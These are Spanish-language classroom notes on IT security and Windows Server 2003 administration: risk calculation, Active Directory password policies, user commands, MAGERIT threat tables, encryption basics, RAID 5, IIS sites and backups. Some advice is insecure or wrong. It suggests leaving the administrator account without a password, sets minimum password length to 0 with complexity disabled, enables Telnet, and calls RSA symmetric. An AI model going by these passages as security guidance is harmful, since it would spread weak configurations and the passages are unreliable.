+Para identificar los riesgos es conveniente realizar un inventario exhaustivo previo donde se recojan todos los activos empresariales
+
+### Ejercicio prácticos de calculo de riesgos
+
+Una empresa que provee de asesoramiento de páginas web (hosting) con un sistema de información valorado en 250.000 €. Un análisis de riesgos revela que hay dos amenazas
+
+- Un fallo eléctrico de suministro
+
+  - Impacto: 10.000 €
+
+  - Probabilidad: 0,1 (10 %)
+
+- Un ataque dirigido desde internet
+
+  - Impacto: 500.000 €
+
+  - Probabilidad: 0,005 (0,5 %)
+
+Nos dice la empresa que el modelo de plan de respuesta a incidentes tiene que optimizar la inversión concentrando los recursos en eliminar la mayor amenaza y asumir el riesgo de las menores. Se pide que:
+
+1.  Cuantificar el riesgo de cada amenaza
+2.  Calcular un presupuesto de seguridad
+3.  Calcular el riesgo que asume la empresa tras la inversión en seguridad
+
+Calculo de los riesgos
+
+$$Amenaza~1 = 10000~€ \times 0,1 = 1000~€ $$
+
+$$Amenaza~2 = 500000~€ \times 0,005 = 2500~€$$
+
+La amenaza 2 pese a ser mucho menos probable que la 1, es de mayor riesgo y de mayor causa de impacto
+
+El presupuesto de seuridad se cuantifica en 2500 € para hacer frente a la amenaza 2. Según el modelo de seguridad de la empresa, se toma la salvaguarda de no hacer nada ante la amenaza 1 con un riesgo asumido resultante de 1000 €.
+
+Pero en cuanto haya presupuesto suficiente, se deberá tratar el riesgo 1.
+
+## POLITICA DE CONTRASEÑAS
+
+Lo primero que concluimos es que una vez promocionado el servidor a controlador de dominio con directorio activo, se aplican directivas de seguridad.
+
+Las directivas afectan al funcionamiento de toda la máquina (dominio) y a los dominios (si lo hubiese) a los que pertenece la máquina.
+
+Ante dos modelos de directivas diferentes, se cumple siempre la politica más restrictiva, por eso las politicas de seguridad es mejor que estén harmonizadas.
+
+- **Contraseñas clase A**: Solo minúsculas
+
+  - siglo
+
+- **Contraseñas Clase B**: Minúsculas + Mayúsculas
+
+  - SiGlo
+
+- **Contraseñas Clase C**: Minúsculas + Mayúsculas + Números
+
+  - Siglo21
+
+- **Contraseñas Clase D**: Minúsculas + Mayúsculas + Números + Caracteres especiales
+
+  - Siglo_21
+
+## GESTION CENTRALIZADA DE SEGURIDAD
+
+Según el esquema nacional de seguridad (ENS) debemos controlar los accesos al servidor y a las máquinas
+
+**Algunas medidas de seguridad**
+
+1.  La cuenta de administrador es mejor que no tenga contraseña para que no se pueda usar para acceso remoto
+    - telnet y ssh exigen contraseña del usuario
+2.  Ningún administrador/técnico usará nunca la cuenta de administrador, sino que usará otra cuenta con permisos de administración y no identificable
+3.  Toda cuenta que no se use (vacaciones, una baja medica,...) debe ser desactivada
+
+### Cambio de las políticas de seguridad en el server
+
+Antes hay que entender las directivas de seguridad de domino y las directivas de seguridad del controlador de dominio
+
+- **Directivas de seguridad de dominio** - Se aplican a todos los usuarios y equipos que forman parte del domino
+
+  - Ejemplo: Todos los usuarios deben cambiar su contraseña cada 42 días
+
+- **Directivas de seguridad del controlador de dominio** - solo se aplica al servidor que es controlador de dominio. No afectan a las máquinas de los usuarios ni a otros servers miembros del DC. Como los DC guardan las contraseñas de los usuarios necesitan un nivel de seguridad mayor y restricciones técnicas que un usario no necesita
+
+  - ejemplo: Solo los administradores pueden iniciar sesión físicamente en el servidor DC
+
+**Cambio de las directivas de seguridad del dominio**
+
+1.  Inicio -\> Herramientas administrativas -\> Directivas de seguridad de dominio
+    - Cuidado por que justo debajo hay una opción muy parecida que cambiaremos después, y todas las pantallas son iguales
+2.  Ir a configuración de seguridad -\> directivas de cuenta -\> directivas de contraseñas
+3.  Cambiamos estas opciones
+    - "Las contraseñas deben cumplir los requerimientos de seguridad"
+
+    - "Longitud mínimo de contraseñas"
+4.  En la primera opción hay que deshabilitarla, aplicar y aceptar
+5.  En la segunda opción quitamos 7 dígitos y ponemos 0, luego aplicar y aceptar
+
+Si hemos hecho todo bien aparecerá que la primera opción está deshabilitada y en la segunda aparece un 0.
+
+**Cambio de las directivas de seguridad del controlador de dominio**
+
+1.  Inicio -\> Herramientas administrativas -\> Directivas de seguridad de controlador de domino
+2.  Vamos a configuración de seguridad -\> Directivas de seguridad
+3.  Ahora podemos ver que todas las directivas están como no definidas
+4.  Vamos a "las contraseñas deben cumplir los requerimientos de seguridad"
+    - Marcamos la caja que dice "Definir esta configuración de directiva"
+
+    - Marcamos deshabilitar
+
+    - Aplicar y aceptar
+5.  Vamos a "Longitid minima de contraseña"
+    - Marcamos la caja de "Definir esta configuración de directiva"
+
+    - Ponemos un 0 en caracteres
+
+    - Aplicar y aceptar
+
+Debe haber las mismas directivas en las dos versiones para que estén harmonizadas.
+
+### Creación de usuarios con permisos
+
+#### Por entorno gráfico
+
+1.  Inicio -\> Herramientas administrativas -\> Usuarios y cuentas de active directory
+2.  Creamos una nueva cuenta
+    - Al crearlo de esta manera, el usuario de momento no tiene ningún tipo de permisos
+3.  Sobre este nuevo usuario -\> Botón derecho -\> Propiedades
+4.  Vamos a miembro de -\> agregar -\> Avanzadas -\> Buscar ahora -\>Asignamos todos los grupos de permisos a ese nuevo usuario
+5.  Aplicar y aceptar
+6.  Saldrá un warning de que un nuevo usuario ya está en el grupo usuarios. No le hacemos caso
+
+En windows los archivos o directorios no tienen permisos, sino que es el grupo al que pertenece el usuario el que tiene los permisos. En el caso de permisos de windows, se cumplen siempre los permisos más permisivos.
+
+- Imaginemos que el usuario pertenece al grupo invitados y al grupo administradores, se cumplen los de administradores
+
+#### Por terminal
+
+1.  Creamos un nuevo usuario
+
+    ``` cmd
+    net user Usuario 1234 /add
+    net user Usuario * /add # si queremos que nadie vea la contraseña
+    ```
+
+2.  comprobamos los grupos
+
+    ``` cmd
+    net localgroup 
+    ```
+
+3.  Darle permisos
+
+    ``` cmd
+    net localgroup Administradores Usuario /add
+    ```
+
+Imaginemos ahora que queremos añadir el Usuario al grupo usuarios de escritorio remoto. Si ponemos el nombre del grupo directo dará error
+
+``` cmd
+net localgroup usuarios de escritorio remoto Usuario /add 
+# Esto da error
+```
+
+Hay que proteger el nombre del grupo entre comillas dobles
+
+``` cmd
+net localgroup "usuarios de escritorio remoto" Usuario /add
+```
+
+## Como activar el Telnet en windows
+
+1.  Mi PC -\> Botón derecho del ratón -\> propiedades -\> acceso remoto
+2.  Marcamos las casillas de:
+    - Activar la asistencia remota y permitir el envio de invitaciones desde este equipo
+
+    - Permitir a los usuarios conectarse remotamente a este equipo
+3.  Aplicar y aceptar
+4.  Vamos a inicio -\> ejecutar -\> services.msc
+5.  Buscamos el telnet
+6.  Lo ponemos en automático, aceptar, iniciar y aplicar
+
+Lo primero es comprobar que hay ping a la máquina a la que queremos conectarnos. Por defecto el ping de windows solo manda 4 paquetes, para que los mande de forma continua como en linux:
+
+``` cmd
+ping 192.168.1.45 -t
+```
+
+## Meter y Sacar máquinas de un dominio
+
+### Meter máquinas en dominio
+
+1.  Vamos al windows XP y corremos net user para ver la cuenta original de instalación. Nos apuntamos esa cuenta en un cuaderno
+2.  vamos a mi pc -\> botón dercho del ratón -\> propiedades
+3.  en esta pestaña cambiamos a miembro de dominio y escribimos el nombre netbios del dominio y aceptamos
+4.  Para saber el nombre netbios del domino vamos al windows server, vamos a usuarios y equipos de active directory y nos fijamos en el nombre
+5.  en el windows XP al darle a aceptar aparece una pantalla que nos pide un usuario y contraseña. Debe ser un usuario del server con privilegios de administrador. Solo un administrador puede meter y sacar equpos de dominio
+6.  Tarda un poco pero aparece un mensaje de "Bienvenido al servidor..."
+7.  Nos pedirá que reiniciemos el windows XP
+8.  Al reiniciar aparece una pantalla de inicio de sesión muy parecida a la del server
+9.  clickamos en opciones
+    - Conectarse a: CLASE10
+10. Nos debemos conectar con un usuario que esté creado en el servidor
+
+### Sacar máquinas del dominio
+
+1.  Nos logueamos en local en el windows XP, es decir con el usuario original del windows XP y conectarse a: Colon10
+2.  Ahora estamos en local pero la máquina sigue dentro del dominio
+3.  Vamos a mi equipo -\> botón derecho del ratón -\> propiedades
+4.  Cambiamos a grupo de trabajo y escribimos INICIOMS
+5.  Nos pide otra vez usuario y contraseña de un administrador en el servidor
+6.  Reiniciamos
+
+## CAMBIOS DE CONTRASEÑAS EN MÁQUINAS EN DOMINIO
+
+### Por entorno gráfico
+
+1.  Vamos a usuarios y contraseñas
+2.  Sobre el usuario -\> Botón derecho y restablecer contraseña
+3.  Le cambiamos la contraseña
+
+Importante - Un administrador nunca debe saber ninguna de las contraseñas de los usuarios sino que les pone contraseñas temporales y la opción de que cambien su contraseña al hacer el primer login.
+
+### Por terminal
+
+simplemente
+
+``` cmd
+net user Usuario * /add
+net user Usuario */logonpasswordchg:yes
+```
+
+La ultima vez hace que la contraseña deba ser cambiada con el próximo login
+
+## ESTUDIO DE SALVAGUARDAS (Tecnología MAGERIT)
+
+Para responder con coherencia a incidentes nos dice que neceistamos una ISO de la familia 27000 y una metodología, pero era y es obligatorio tenerla. Sin embargo, no se especifica cual. También es posible crear una propia siguiendo la ISO 27002.
+
+- **MAGERIT** - Metodología de análisis y gestión de riesgos de los sistemas de la información
+
+  - Completamente gratuita en 3 libros
+
+  - Divide los incidentes y amenazas
+
+    - Amenazas naturales
+
+    - Amenazas debidas al entorno (ambiente) o al hombre
+
+    - Amenzas accidentales o intencionadas
+
+- **COBIT** - Control Objectives for information and related technologies
+
+  - Creada por la ISACA, EEUU
+
+- **OCTAVE** - Operationally critical threat asset and vulnerability evaluator
+
+  - Sudamérica
+
+### Amenazas riesgos y salvaguardas en MAGERIT
+
+#### Desastres naturales
+
++-----------------+---------------------------------------------------+-----------------------------------------------------------------------+
+| Amenazas        | Riesgos                                           | Salvaguardas                                                          |
++=================+===================================================+=======================================================================+
+| | Incendios     | | Que el fuego acabe con los recursos del sistema | | Protección ante incendios (extintor)                                |
++-----------------+---------------------------------------------------+-----------------------------------------------------------------------+
+| | Inundación    | | Que el agua acabe con los recursos del sistema  | | Protección ante inundación (CPD en 3a planta)                       |
++-----------------+---------------------------------------------------+-----------------------------------------------------------------------+
+| | Rayo/Tormenta | | Destrucción de los equipos electrónicos         | | Protección de instalación frente a descargas eléctricas (Pararayos) |
++-----------------+---------------------------------------------------+-----------------------------------------------------------------------+
+
+#### De Origen industrial
+
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Amenazas                                                     | Riesgos                                         | Salvaguardas                                                                  |
++==============================================================+=================================================+===============================================================================+
+| Incendios                                                    | Que el fuego acabe con los recursos del sistema | Protección ante incendios (extintor)                                          |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Inundaciones/Escapes                                         | Que el agua acabe con los recursos del sistema  | Protección ante inundaciones (nunca hay tuberías que pasen por el CPD)        |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Sobrecarga eléctrica o fluctuaciones eléctricas              | Destrucción de equipos eléctricos               | Protección de instalaciones ante descargas electricas                         |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Contaminación mecánica/vibraciones/suciedad                  | Destrucción de los sistemas eléctricos          | Mantenimiento preventivo de limpieza y reposición de componentes electrónicos |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Avería de orígen físico/lógico. Fallas en equipos o software | Paradas del sistema y pérdidas de input         | Disponer de sistemas de funcionamiento redundante                             |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Corte de suministro eléctrico                                | Paradas del sistema                             | Sistemas de alimentación intermedio (SAI) o en inglés (UPS)                   |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Condiciones inadecuadas de temperatura y humedad             | Duestrucción de componentes                     | Sistemas de aire condicionado para exceso de temperatura o humedad            |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Fallo de servicio de comunicaciones                          | Paradas del sistema de comunicaciones           | Disponer de rutas redundantes                                                 |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+| Degeneración de soporte de almacenamiento                    | Paradas del sistema y pérdida de información    | Empleo de soporte redundantes y políticas de copias de seguridad              |
++--------------------------------------------------------------+-------------------------------------------------+-------------------------------------------------------------------------------+
+
+#### Errores no intencionados
+
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Amenazas                                                                                 | Riesgos                                                    | Salvaguardas                                                                        |
++==========================================================================================+============================================================+=====================================================================================+
+| Erreres de usuarios                                                                      | Pérdida de información                                     | Copias de seguridad                                                                 |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Errores de administrador                                                                 | Parada del sistema                                         | Disociación de responsabilidades                                                    |
+|                                                                                          |                                                            |                                                                                     |
+|                                                                                          | Ausencia de seguridad                                      | Reducción de daños                                                                  |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Deficiencias de organización (no está claro quién hace que)                              | Paradas del sistema por acciones descordinadas o omisiones | Políticas de seguridad con establecimiento claro de resposabilidades y responsables |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Malware, difusión de software dañino (Virus, spy ware, gusanos, troyanos,...)            | Paradas del sistema                                        | Software antivirus, procedimientos y manuales.                                      |
+|                                                                                          |                                                            |                                                                                     |
+|                                                                                          | Ausencia de seguridad                                      | Reinstalaciones y copias de seguridad                                               |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Fugas de información                                                                     | Pérdida completa de confidencialidad                       | Validación de funciones resumen (hash)                                              |
+|                                                                                          |                                                            |                                                                                     |
+| (La información llega a quién no debe)                                                   |                                                            | Encriptación                                                                        |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Alteración accidental de la información                                                  | Pérdida completa de la integridad de la información        | Validación de funciones resumen (hash)                                              |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Vulnerabilidades de los programas (defectos en codigo que producen errores)              | Paradas del sistema                                        | Entornos de pruebas y resumen de sistema                                            |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Errores de mantenimiento o actualizaciones en programas/sistema                          | Paradas del sistema                                        | Plan de mantenimiento preventivo para revisar fecha de actuación                    |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Caida de sustema por agotamiento de recursos (RAM o disco duro)                          | Parada del sistema                                         | Aplicaciones de monitorización de recursos (webmin/cockpit)                         |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+| Indisponibilidad del personal de caracter accidental del puesto de trabajo (baja médica) | Parada del sistema                                         | Política de seguridad del restablecimiento de responsabilidades                     |
+|                                                                                          |                                                            |                                                                                     |
+|                                                                                          |                                                            | Designación de suplentes/retén                                                      |
++------------------------------------------------------------------------------------------+------------------------------------------------------------+-------------------------------------------------------------------------------------+
+
+#### Errores intencionales
+
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Amenazas                                             | Riesgos                                              | Salvaguardas                                                                                                       |
++======================================================+======================================================+====================================================================================================================+
+| Manipulación de la información                       | Parada del sistema                                   | Copias impresas                                                                                                    |
+|                                                      |                                                      |                                                                                                                    |
+|                                                      | Ausencia de seguridad                                | Reinstalación y configuración del sistema                                                                          |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Suplantación de identidad del usuario                | Pérdida completa de la confidencialidad e integridad | Sistemas de autenticación fuertes (medidas bioinformáticas)                                                        |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Difusión intencionada de malware                     | Parada del sistema                                   | Software de eliminación de virus, procedimientos de reinstalación y configuración del sistema, copias de seguridad |
+|                                                      |                                                      |                                                                                                                    |
+|                                                      | Ausencia de seguridad                                |                                                                                                                    |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Análisis de tráfico no autorizado                    | Conocimiento de pautas de actividad de la empresa    | Encapsulamiento de protocolos (VPN)                                                                                |
+|                                                      |                                                      |                                                                                                                    |
+|                                                      |                                                      | Medidad de encriptación                                                                                            |
+|                                                      |                                                      |                                                                                                                    |
+|                                                      |                                                      | comunicaciones seguras de extremo a extremo                                                                        |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Uso no previsto (uso personal, juegos,...)           | Paradas del sistema                                  | Impedir la ejecución de procesos no autorizados                                                                    |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Repudio (negación de un hecho realiado facticamente) | Pérdida de la trazabilidad de operaciones            | Firma digital                                                                                                      |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Intercepción de información (escucha)                | Perdida de la confidencialidad                       | Criptografía                                                                                                       |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Denegación de servicion (DoS)                        | Parada del sistema                                   | Penalización de solicitudes recurrentes                                                                            |
+|                                                      |                                                      |                                                                                                                    |
+|                                                      |                                                      | Sistemas IDS e IPS                                                                                                 |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Robo de equipo/soporte                               | Parada del sistema                                   | Alarma antirrobo, anclar los equipos (dockstation), criptografía                                                   |
+|                                                      |                                                      |                                                                                                                    |
+|                                                      | Pérdida de confidencialidad                          |                                                                                                                    |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Ataque destructivo, vandalismo, terrorismo           | Parada del sistema                                   | Copias de seguridad fuera de instalaciones, acuerdo de alquiler de equipos, copias impresas y reinstalación        |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+| Ingeniería social                                    | Parada del sistema                                   | Concienciación y formación                                                                                         |
+|                                                      |                                                      |                                                                                                                    |
+|                                                      | ausencia de seguridad                                | Empleo de mecanismos de autenticación                                                                              |
+|                                                      |                                                      |                                                                                                                    |
+|                                                      | Trazabilidad                                         | devolver llamada                                                                                                   |
++------------------------------------------------------+------------------------------------------------------+--------------------------------------------------------------------------------------------------------------------+
+
+- **IDS** - Intrussion detection system (sistema de detección de intrusión)
+
+- **IPS** - Intrusion protection system (Sistema de protección de intrusiones)
+
+Siempre se hacen al menos dos copias, una queda en la empresa, otra a resguardo en algún lugar conocido fuera de la compañía (abogados por ejemplo)
+
+## ALGORITMOS DE CIFRADO
+
+### Cifrado simétrico (AES)
+
+**AES** - Advanced Encryption Standard
+
+Se usa la misma clave para encriptar y desencriptar
+
+```{mermaid}
+%%{init:{'theme': 'forest'}}%%
+flowchart LR
+  A["Emisor+Clave"] ---> B["Receptor+Clave"]
+```
+
+![](images/clipboard-3227346149.png)
+
+### Cifrado simétrico (RSA)
+
+**RSA** - Rivest, Shamir y Adleman
+
+Aquí cada persona tiene dos claves, una pública y otra privada que están asociadas. La clave pública está publicada y es accesible a cualquiera pero la privada no. Entonces hay dos opciones:
+
+Una para enviar mensajes y que solo el receptor pueda leerlos:
+
+```{mermaid}
+%%{init:{'theme': 'forest'}}%%
+flowchart LR
+    A["EMISOR<br/>mensaje + Clave pública del receptor"] ---> B["RECEPTOR<br/>desencripta con su clave privada"]
+```
+
+Otra de autenticación del emisor:
+
+```{mermaid}
+%%{init:{'theme': 'forest'}}%%
+flowchart LR
+  A["EMISOR<br/>mensaje+Clave Privada del emisor"] ---> B["RECEPTOR<br/>Mensaje desencriptado con cave publica del emisor"]
+```
+
+En el segundo caso como cualquiera puede tener la clave publica del emisor, se usa para asegurarnos de que el mensaje solo ha podido ser enviado por ese emisor en concreto (Este mensaje solo lo ha podido enviar Juan)
+
+![](images/clipboard-1611405963.png)
+
+## MEDIOS DE ALMACENAMIENTO Y SISTEMA RAID
+
+un medio de almacenamiento (externo en general) es cualquier dispositivo que pueda contener datos. Desde un disquete o un USB a un disco duro de cualquier capacidad. En servidores debemos conocer los sistemas (Todos los discos )
+
+- **Disco duro básico** - Discos que contienen el SO y el arranque MBR o GPT
+
+- **Disco duro dinámico** - Discos que contienen información. Se tratan como volúmenes, es decir, se pueden redimensionar
+
+En servidores se montan los sistemas RAID
+
+### Sistemas RAID básicos
+
+- **RAID 0** - Necesita como mínimo 2 discos duros pero no tiene limite máximo de discos
+
+  - Permite aumentar el tamaño de disco como si solo fuera uno solo
+
+  - Se aumenta la velocidad de transferencia
+
+  - **DESVENTAJA** - Si falla un disco se pierde absolutamente todo
+
+![](images/clipboard-2281403250.png)
+
+- **RAID 1** - Mirroring
+
+  - Necesita como mínimo 2 discos duros y solamente pueden ser dos
+
+  - No se gana velocidad de transferencia
+
+  - Hace copias de seguridad en tiempo real del disco duro del usuario
+
+  - Se pierde el tamaño de un disco
+
+![](images/clipboard-2328017079.png)
+
+- **RAID 5** - Se necesitan al menos 3 discos (Ninguno de ellos del sistema)
+
+  - Se suma el tamaño de los discos pero se pierde siempre un disco en bandas de paridad distribuidas
+
+    - Si tengo 20 discos, se usan 19 y se pierde 1 disco en bandas de paridad. Se generan 20 bandas de paridad de las que 19 son de datos y otra de pares
+
+  - Solo sirve de medio de almacenamiento seguro por medio de las bandas de paridad
+
+![](images/clipboard-723291913.png)
+
+## CREACIÓN DE UN SISTEMA RAID 5 PARA EL WINDOWS SERVER
+
+1.  Comprobamos el espacio disponible en el disco del anfitrión en mi equipo-\> C: propiedades
+    - Necesitamos 30 GB así que debe haber al menos 40 GB libres
+2.  Abrimos virtual box con todas las máquinas cerradas
+3.  seleccionamos el windows server y vamos a configuración-\> almacenamiento
+4.  Vemos que tiene un controlador IDE pero para un sistema RAID necesitamos una controladora SCSI
+    - Si solo quisiesemos añadir otro disco duro sin sistema RAID valdría con añadirselo al IDE como un nuevo disco
+5.  Abajo añadimos un nuevo controlador de almacenamiento (el icono es de color verde)
+6.  Elegimos controladora LsiLogic (SCSI predeterminado)
+7.  Aparecerá una controladora nueva
+8.  Abrimos la máquina virtual windows server y vamos a mi pc -\> Administrador de dispositivos
+    - Debe aparecer "Controladora SCSI y sistema RAID" si no aparece no podemos seguir
+9.  Apagamos la máquina windows server y volvemod a la pantalla de almacenamiento de virtualbox
+10. Sobre la controladora SCSI añadimos un nuevo disco y pulsamos crear nuevo
+11. Hay que crear 3 discos totalmente iguales
+    - VDI
+
+    - Disco Fijo
+
+    - 10 GB
+
+    - crear
+12. Tardará unos minutos en crear cada disco
+13. Cuando estén creados aparecen pero como not attached
+14. Sobre la controladora SCSI añadimos discos y elegimos lo que hemos creado
+15. Arrancamos el windows server y vamos a administracion de discos
+16. Nos sale una configuración que nos guiará para añadir el sistema RAID
+    - Seleccionamos todos los discos que seran disco 1, disco 2, disco 3
+
+    - El disco 0 contiene nuestro sistema operativo
+
+    - Seguimos hasta finalizar
+17. Ahora sobre administración de disco con botón derecho del ratón vamos a "nuevo" -\> "Volumen"
+18. Aparece otra configuración guiada
+    - RAID5 y agregamos los discos
+
+    - Asignamos la letra de la unidad -\> G
+
+    - Formatear
+
+      - Aqui en etiqueta de volumen escribimos: RAID 5
+19. Empezará a formatear los discos y si lo hemos hecho bien veremos que todos los discos formatean exactamente a la misma velocidad.
+20. Cuando termine el formateo veremos que aparece un nuevo disco de 20 GB
+
+## ALOJAMIENTO DE WEB PUBLICA Y PRIVADA
+
+1.  Dentro del RAID creamos estas carpetas:
+    - FTP_PRV
+
+    - FTP_PUB
+
+    - WEB_PRV
+
+    - WEB_PUB
+2.  ahora llevamos la web publica y la privada que hayamos creado a las carpetas del RAID 5
+    - web_publica.html en RAID5/WEB_PUB
+
+    - web_privada.html en RAID5/WEB_PRIV
+
+### Como ver un USB en virtualBox
+
+1.  Con la máquina cerrada vamos a configuración en virtualbox
+2.  Le damos al icono de un USB con un + verde. Esto nos montará un filtro USB para el USB en concreto que usamos
+3.  Elegimos el USB en concreto
+4.  Veremos que el USB desaparece del anfitrión y aparece la máquina virtual
+    - Mientras el USB esté en uso por la VM no se ve en el afitrión
+
+    - NUNCA QUITAR EL USB MIENTRAS ESTE EN USO, SE PUEDE ESTROPEAR VM Y USB
+
+    - NUCA SE EXPULSA EN FORMA SEGURA EL USB EN UNA VIRTUALIZACION DARÁ ERROR
+
+    - Para quitar el usb hay que apagar la virtualización
+5.  Para evitar problemas futuros eliminamos el filtro USB creado
+
+**EN VIRTUALIZACIONES SIEMPRE FAT32 o NTFS**
+
+#### Otra forma
+
+1.  Con el USB introducido, y la máquina abierta vamos arriba del todo a la derecha en dispositivos
+
+2.  USB y elegimos el USB que queremos conectar y lo clickamos
+
+3.  Se conectará el USB en la máquina. Tardará un rato.
+
+4.  Para quitarlo volvemos a dispositivos-\>USB y desmarcamos el USB
+
+    Esto le devuelve el USB al anfitrión, luego en el anfitrión lo expulsamos de forma segura
+
+## INTERNET INFORMATION SERVICE (IIS) EN WINDOWS SERVER 2003
+
+1.  Comprobamos antes de arrancar la máquina que tiene el disco ISO
+2.  Iniciamos la máquina y vamos a inicio-\> ejecutar-\>control
+3.  Agregar o quitar componentes de windows
+4.  Aparecerá un desplegable con opciones
+5.  Ahora marcamos por completo internet information service (IIS)
+    - Lo marco por completo por comodidad y rapidez pero habría que elegir uno a uno cada servicio
+
+    - Nunca se sobrecarga un servidor con aplicaciones por que da problemas de red
+6.  Dentro de IIS marcamos
+    - FTP
+
+    - Dentro de servicio worl wide web -\> todos
+7.  Luego inicio -\> administración -\> administrador de internet information services
+8.  Vemos el sitio FTP y el sitio Web
+9.  Vamos a los sitios FPT y vemos que hay uno creado por determinado
+    - Nunca lo tocamos o los eliminamos ya que se puede usar como ejemplo
+10. Sobre sitios FTP botón derecho del ratón -\> Nuevo sito FTP
+11. Aparece un asistente de generación de sitio FTP
+    - Descripción: Público y siguiente
+
+    - Dirección IP -\> Ninguna asignada ( Obdedece a todas las IP )
+
+    - Puerto -\> 1175
+
+      - El 21 está asignado al sitio FTP predeterminado
+
+    - Aparecen 3 opciones -\> No aislar usuarios
+
+    - Ruta de acceso: RAID5/FTP_PUB
+
+    - Habilitamos lo permisos de
+
+      - Lectura - permitimos descargas
+
+      - escrituras - Permitimos subir archivos
+12. Repetimos lo mismo para le FTP privado
+    - Descripción - Privado
+
+    - puerto: 1176
+
+    - No aislar usuarios
+
+    - Ruta: RAID5/FTP_PRIV
+
+    - habilitamos lectura y escritura
+13. Queremos que el usuario anónimo pueda entrar en el servidor publico - Por defecto el FTP se crea en privado
+    - en PUBLICO -\> Ratón derecho del ratón -\> Propiedades
+
+    - Para darle acceso anónimo vamos a
+
+      - Cuentas de seguridad -\> Permitir conexiones anónimas
+
+      - Hay que comprobar que en el privado no esté permitido
+14. Ahora vamos a sitio web -\> Botón derecho del ratón -\> nuevo -\> sitio web
+    - Descripción: PUBLICO
+
+    - Puerto: 1180 (el puerto 80 es para el predeterminado)
+
+    - Ruta: RAID5/WEB_PUB
+
+    - Permitir accesos anónimos a este sitio web
+
+    - Permisos scope - le damos todos los permisos
+
+      - Le damos todos los permisos scope
+15. Creamos también la web privada de la misma manera
+    - Descripción: Privado
+
+    - Puerto: 1181
+
+    - Ruta: RAID5/WEB_PRV
+
+    - Todos los permisos igual que antes
+16. Ahora sobre el sitio web_privado -\>botón derecho del ratón-\> Seguridad de directorios-\> Modificar -\> quitamos "Habilitar acceso anónimo"
+
+### Como podemos ver la web publica y la privada
+
+En windows 10 abrimos una pestaña de google chrome o de otro navegador y escribimos:
+
+https://192.168.1.199:1180 - Web publica
+
+https://192.168.1.199:1181 - Web privada (pide login y contraseña de un usuario en el server)
+
+Podemos ver también que hay otro sitio web llamado administración o administrador (podemos verla en inicio-\>administrador de IIS -\> sitio web -\> administración/administrador -\> botón derecho del ratón
+
+Vemos que tiene los puertos:
+
+- Puerto TCP: 8090 (puerto HTTP)
+
+- Puerto SSL: 8098 (puerto HTTPS)
+
+Usamos el HTTPS. **Administrador es un sitio web para administrar el servidor en remoto, similar a webmin y cockpit en linux**
+
+## COPIAS DE SEGURIDAD EN EL SERVER
+
+Hay muchas formas de realizar copias de seguridad, con distintos programas y formas pero simpre lo primero es definir una planificación clara de como hacer las copias, cuando, cuántas veces, con que herramiena,....
+
+Antes de empezar en el RAID creamos algunas carpetas y dentro algunos archivos tipo txt en los que escribimos la fecha de creación del archivo, la hora y algo más para comprobar la recuperación
+
+### Creando una copia de seguridad manual simple
+
+1.  Inicio -\> ejecutar -\> ntbackup
+2.  Aparece un asistente de copias de seguridad y chequeamos "empezar en modo asistente" y le damos a siguiente
+3.  Ejecutar una copia de seguridad
+4.  Elegir lo que deseo incluir en la copia de seguridad
+    - Solo nos interesan los datos, no el SO
+5.  Aparece una lista de elementos que se incluirán en la copia de seguridad
+    - Vamos a mi PC y aparecen los discos
+
+    - Elegimos el RAID5 por completo
+6.  Aparece otra pantalla para elegir dónde guardas
+    - Normalmente se hace en un disco extraible, un USB por ejemplo, un disco duro externo
+
+    - Elegimis guardarlo en documentos y le cambiamos el nombre a "copia1.bkf"
+7.  Aparece otra pantalla resumen que debemos leer. Si le damos a finalizar hace una copia de seguridad de forma automática pero no hace más copias ni copias de forma automática
+8.  Hace la copia de seguridad y aparece una patalla de progreso
+    - Antes de cerrar le damo a informe... y lo leemos
+
+    - Guardamos ese archivo
+
+    - Por defecto se guardan en c:\\Documents and settings\\TECNICO\\configuracion local\\Datos de programa\\Microsoft\\Windows NT\\NT Backup\\Data
+9.  Ya tenemos la copia de seguridad ahora comprobamos que está
+    - Se guardan en: C:\\documents and settings\\TECNICO\\mis documentos
